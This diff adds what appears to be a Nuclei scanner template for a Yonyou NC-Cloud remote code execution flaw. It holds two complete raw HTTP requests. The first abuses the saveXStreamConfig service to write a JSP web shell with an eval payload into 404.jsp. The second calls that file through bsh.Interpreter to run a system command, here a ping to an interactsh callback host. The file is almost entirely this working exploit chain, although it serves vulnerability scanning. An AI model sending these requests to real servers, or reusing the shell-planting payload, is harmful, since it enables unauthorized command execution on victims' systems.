@@ -1,0 +1,58 @@
+id: yongyouOA-cloud-RCE
+info:
+  name: 用友nc-cloud RCE
+  author: cnaq
+  severity: critical
+  description: 用友nc-cloud RCE
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8Bnc-cloud%20RCE.md
+  tags: weaver,rce
+
+requests:
+  - raw:
+      - |
+        POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: cookiets=168170496; JSESSIONID=33A343770FF.server
+        If-None-Match: W/"1571-1589211696000"
+        If-Modified-Since: Mon, 11 May 2020 15:41:36 GMT
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 249
+
+        {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/404.jsp"]}
+
+      - |
+        POST /404.jsp?error=bsh.Interpreter HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: cookiets=1681785232226; JSESSIONID=334D3ED07A343770FF.server
+        If-None-Match: W/"1571-1589211696000"
+        If-Modified-Since: Mon, 11 May 2020 15:41:36 GMT
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 104
+
+        cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ping {{interactsh-url}}").getInputStream())
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
